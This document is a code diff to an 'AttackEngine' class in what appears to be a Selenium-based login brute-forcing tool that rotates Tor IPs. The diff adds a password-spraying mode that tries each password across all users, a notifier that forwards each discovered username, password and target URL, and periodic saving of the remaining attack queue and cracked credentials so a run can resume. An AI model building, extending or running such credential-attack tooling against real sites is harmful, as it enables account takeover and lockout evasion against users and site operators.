@@ -26,6 +26,7 @@ from .constants import (
     CSS_PATH_JS,
     HAS_KEYBOARD,
 )
+from .session import SessionManager
 from .utils import (
     build_chrome_options,
     change_tor_ip,
@@ -173,6 +174,8 @@ class AttackEngine:
         self._running = True
         self._start_time = time.time()
         self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))
+        self._session_mgr = SessionManager() if ctx.get("enable_session", True) else None
+        self._ctx = ctx
 
         self.metrics = {
             "attempted": 0,
@@ -209,11 +212,17 @@ class AttackEngine:
             MAX_RETRIES_PER_COMBO: int = 3
 
             q: Queue = Queue(maxsize=1000)
+            spray_mode = ctx.get("spray_mode", False)
 
             def populate() -> None:
-                for u in users:
+                if spray_mode:
                     for p in passwords:
-                        q.put((u, p))
+                        for u in users:
+                            q.put((u, p))
+                else:
+                    for u in users:
+                        for p in passwords:
+                            q.put((u, p))
 
             threading.Thread(target=populate, daemon=True).start()
 
@@ -486,6 +495,20 @@ class AttackEngine:
                                 )
                                 with self._metrics_lock:
                                     self.metrics["successes"] += 1
+
+                                if "notifier" in ctx:
+                                    try:
+                                        ctx["notifier"].notify(
+                                            "credential_found",
+                                            {
+                                                "username": user,
+                                                "password": pwd,
+                                                "target_url": ctx["target_url"],
+                                            },
+                                        )
+                                    except Exception:
+                                        pass
+
                                 try:
                                     entry = f"{user}:{pwd}\n"
                                     with self._found_lock:
@@ -510,6 +533,19 @@ class AttackEngine:
                                 q.task_done()
                                 self._emit_metrics()
 
+                                # Auto-save session periodically
+                                if self._session_mgr and done[0] % self._session_mgr.auto_save_interval == 0:
+                                    remaining = []
+                                    try:
+                                        with q.mutex:
+                                            remaining = list(q.queue)
+                                    except Exception:
+                                        pass
+                                    self._session_mgr.save_state(
+                                        self._ctx, remaining, dict(self.metrics),
+                                        list(self._found_creds),
+                                    )
+
                                 if not continue_after and not multiple_users:
                                     with q.mutex:
                                         q.queue.clear()
@@ -528,6 +564,19 @@ class AttackEngine:
                             self._emit_progress(done[0], total)
                             q.task_done()
                             self._emit_metrics()
+
+                            # Auto-save session periodically
+                            if self._session_mgr and done[0] % self._session_mgr.auto_save_interval == 0:
+                                remaining = []
+                                try:
+                                    with q.mutex:
+                                        remaining = list(q.queue)
+                                except Exception:
+                                    pass
+                                self._session_mgr.save_state(
+                                    self._ctx, remaining, dict(self.metrics),
+                                    list(self._found_creds),
+                                )
 
                         except (NoSuchElementException, TimeoutException):
                             self._log(
@@ -586,4 +635,7 @@ class AttackEngine:
                     self._finished_callback(False, "No valid credentials found.")
 
         finally:
+            # Clear session on completion
+            if hasattr(self, "_session_mgr") and self._session_mgr:
+                self._session_mgr.clear_session()
             self._running = False
